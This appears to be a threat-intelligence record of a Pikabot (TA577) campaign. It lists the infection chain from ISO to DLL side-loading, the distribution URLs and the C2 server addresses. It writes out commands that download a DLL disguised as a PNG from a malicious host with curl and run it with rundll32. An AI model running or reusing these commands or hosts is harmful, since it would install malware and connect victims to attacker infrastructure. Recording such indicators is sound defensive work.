@@ -1,0 +1,55 @@
+27.02.2024 | Pikabot | TA577 |  
+
+*************************************************
+
+.iso
+.dll
+
+*************************************************
+
+T1574 - DLL Search Order Hijacking
+
+*************************************************
+
+.iso > write.exe > 
+
+Open_Document.exe
+
+cmd /c data\document.rtf
+
+WINWORD.EXE /n C:\Users\Admin\AppData\Local\Temp\data\document.rtf /o
+
+cmd.exe /c md c:\wnd
+
+
+cmd.exe /c curl.exe --output c:\wnd\3291.png --url https://yourunitedlaws.com/mrD/4462
+
+curl.exe --output c:\wnd\3291.png --url https://yourunitedlaws.com/mrD/4462
+
+rundll32 c:\wnd\3291.png,GetModuleProp
+
+
+*************************************************
+
+.dll distro
+
+https://yourunitedlaws.com/mrD/4462
+https://topflowersclub.com/aUvM/6875
+
+*************************************************
+
+c2's
+
+https://154.12.236.248:13786
+https://158.247.240.58:5632
+https://70.34.199.64:9785
+https://94.72.104.77:13724
+https://209.126.86.48:1194
+https://154.53.55.165:13783
+https://84.46.240.42:2083
+https://45.77.63.237:5632
+https://94.72.104.80:5000
+https://198.38.94.213:2224
+https://70.34.223.164:5000
+
+*************************************************
